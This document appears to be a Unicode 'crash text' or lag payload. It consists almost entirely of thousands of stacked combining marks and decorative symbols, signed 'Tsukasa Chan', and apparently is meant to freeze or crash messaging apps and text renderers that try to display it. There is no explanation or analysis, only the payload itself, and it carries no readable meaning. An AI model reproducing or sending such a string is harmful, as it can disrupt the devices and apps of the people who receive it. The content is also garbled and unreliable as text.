ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝